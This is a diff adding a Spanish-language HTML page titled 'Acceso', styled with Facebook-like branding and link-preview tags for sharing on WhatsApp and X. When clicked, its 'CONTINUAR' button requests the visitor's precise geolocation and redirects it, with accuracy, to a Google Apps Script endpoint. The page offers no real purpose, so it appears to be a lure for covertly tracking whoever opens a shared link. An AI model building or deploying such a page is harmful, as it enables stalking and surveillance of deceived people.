@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Acceso</title>
+
+  <!-- =========================
+       VISTA PREVIA PARA WHATSAPP
+       ========================= -->
+
+  <meta property="og:title" content="Acceso">
+
+  <meta property="og:description"
+        content="Acceda al sitio para continuar.">
+
+  <meta property="og:type" content="website">
+
+  <meta property="og:image"
+        content="https://raw.githubusercontent.com/mjchgmaria99-crear/FACEBOOK/main/logo.png">
+
+  <meta property="og:image:type"
+        content="image/png">
+
+  <meta property="og:image:alt"
+        content="Imagen del sitio">
+
+  <!-- =========================
+       TWITTER / X
+       ========================= -->
+
+  <meta name="twitter:card"
+        content="summary_large_image">
+
+  <meta name="twitter:title"
+        content="Acceso">
+
+  <meta name="twitter:description"
+        content="Acceda al sitio para continuar.">
+
+  <meta name="twitter:image"
+        content="https://raw.githubusercontent.com/mjchgmaria99-crear/FACEBOOK/main/logo.png">
+
+
+  <style>
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      width: 100%;
+      min-height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      background:
+        linear-gradient(
+          135deg,
+          #0b1f36,
+          #155b80
+        );
+
+      color: white;
+    }
+
+    .contenedor {
+      width: min(90%, 420px);
+      padding: 40px 30px;
+
+      text-align: center;
+
+      background: rgba(255,255,255,.97);
+
+      color: #172b4d;
+
+      border-radius: 22px;
+
+      box-shadow:
+        0 20px 60px rgba(0,0,0,.30);
+    }
+
+    .logo {
+      width: 100px;
+      height: 100px;
+
+      object-fit: contain;
+
+      border-radius: 18px;
+
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: 24px;
+    }
+
+    p {
+      margin: 0 0 25px;
+      color: #667085;
+      line-height: 1.5;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+
+      border: 0;
+      border-radius: 10px;
+
+      background: #1877f2;
+      color: white;
+
+      font-size: 16px;
+      font-weight: bold;
+
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #0d65d9;
+    }
+
+    #estado {
+      margin-top: 18px;
+      font-size: 13px;
+      color: #667085;
+    }
+
+  </style>
+
+</head>
+
+
+<body>
+
+  <main class="contenedor">
+
+    <img
+      class="logo"
+      src="https://raw.githubusercontent.com/mjchgmaria99-crear/FACEBOOK/main/logo.png"
+      alt="Imagen del sitio"
+    >
+
+    <h1>Continuar</h1>
+
+    <p>
+      Para continuar, puedes permitir el acceso a tu
+      ubicación cuando el navegador lo solicite.
+    </p>
+
+    <button id="continuar">
+      CONTINUAR
+    </button>
+
+    <div id="estado"></div>
+
+  </main>
+
+
+<script>
+
+const URL_DESTINO =
+  "https://script.google.com/macros/s/AKfycbxaNqn7lASDeEfrJ2IC_GyKpkWs2PbbLmRHKKCwLPcl60qRk9PdyELKL82UzDpxjn0Y/exec";
+
+
+const boton =
+  document.getElementById("continuar");
+
+const estado =
+  document.getElementById("estado");
+
+
+boton.addEventListener(
+  "click",
+  solicitarUbicacion
+);
+
+
+function solicitarUbicacion() {
+
+  estado.textContent =
+    "Solicitando permiso de ubicación...";
+
+  boton.disabled = true;
+
+
+  if (!navigator.geolocation) {
+
+    estado.textContent =
+      "Este navegador no permite obtener ubicación.";
+
+    redireccionar();
+
+    return;
+  }
+
+
+  navigator.geolocation.getCurrentPosition(
+
+    function(position) {
+
+      const latitud =
+        position.coords.latitude;
+
+      const longitud =
+        position.coords.longitude;
+
+      const precision =
+        position.coords.accuracy;
+
+
+      /*
+       * Enviar ubicación a Apps Script.
+       *
+       * La URL contiene las coordenadas únicamente
+       * después de que el usuario haya concedido
+       * el permiso del navegador.
+       */
+
+      const destino =
+        URL_DESTINO +
+        "?latitud=" +
+        encodeURIComponent(latitud) +
+        "&longitud=" +
+        encodeURIComponent(longitud) +
+        "&precision=" +
+        encodeURIComponent(precision);
+
+
+      estado.textContent =
+        "Ubicación autorizada. Continuando...";
+
+
+      window.location.href =
+        destino;
+
+    },
+
+
+    function(error) {
+
+      /*
+       * Si la persona rechaza el permiso,
+       * no se obtiene ninguna coordenada.
+       */
+
+      estado.textContent =
+        "No se obtuvo la ubicación. Continuando...";
+
+      setTimeout(
+        redireccionar,
+        800
+      );
+
+    },
+
+
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+
+  );
+
+}
+
+
+function redireccionar() {
+
+  window.location.href =
+    URL_DESTINO;
+
+}
+
+</script>
+
+</body>
+
+</html>
